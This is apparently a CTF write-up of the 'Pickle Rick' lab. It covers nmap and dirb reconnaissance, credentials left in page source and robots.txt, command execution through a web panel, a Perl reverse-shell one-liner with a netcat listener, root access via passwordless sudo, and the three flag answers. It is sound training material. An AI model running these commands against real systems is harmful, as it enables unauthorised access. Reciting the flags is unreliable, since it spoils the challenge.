
```
$ nmap -T4 -Pn 10.67.128.80

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

$ nmap -p21,80 -sCV 10.67.128.80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 12:62:4D:86:3F:DF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![imagen](https://github.com/user-attachments/assets/4732318f-8069-49d7-81a3-2e3c383f8a99)

![imagen](https://github.com/user-attachments/assets/e0562e95-eb11-4b01-8925-30573b2abb2c)

Note to self, remember username!
Username: R1ckRul3s

```

dirb http://10.67.128.80


GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.67.128.80/ ----
==> DIRECTORY: http://10.67.128.80/assets/                                     
+ http://10.67.128.80/index.html (CODE:200|SIZE:1062)                          
+ http://10.67.128.80/robots.txt (CODE:200|SIZE:17)                            
+ http://10.67.128.80/server-status (CODE:403|SIZE:277)  
```

In robots.txt we see a text: Wubbalubbadubdub

With http-enum script from nmap I found a directory login.php where i can verify if the credentials are valid:
http://10.67.128.80/login.php
![[Pasted image 20260221124825.png]]

And we gain access to several directories, including a command panel form:
![[Pasted image 20260221124925.png]]

listing files we can see Sup3rS3cretPickl3Ingred.txt, wheree we will find the first ingredient.
![[Pasted image 20260221130121.png]]
We have cat command disabled but we can access http://10.67.128.80/Sup3rS3cretPickl3Ingred.txt.
Fort the next ingredient, I am using Reverse Shell Generator:

![[Pasted image 20260221130818.png]]
```
perl -e 'use Socket;$i="10.67.181.217";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

```
root@ip-10-67-181-217:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.67.128.80 49596
sh: 0: can't access tty; job control turned off
$ ls
Sup3rS3cretPickl3Ingred.txt
...

$ ls /home/rick
second ingredients
$ cat 'second ingredients'
1 jerry tear

$ sud o -l
sh: 8: sud: not found
$ sudo -l
Matching Defaults entries for www-data on ip-10-67-128-80:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-67-128-80:
    (ALL) NOPASSWD: ALL
$ sudo ls /root
3rd.txt
snap
$ sudo cat /root/3rd.txt
3rd ingredients: fleeb juice
```
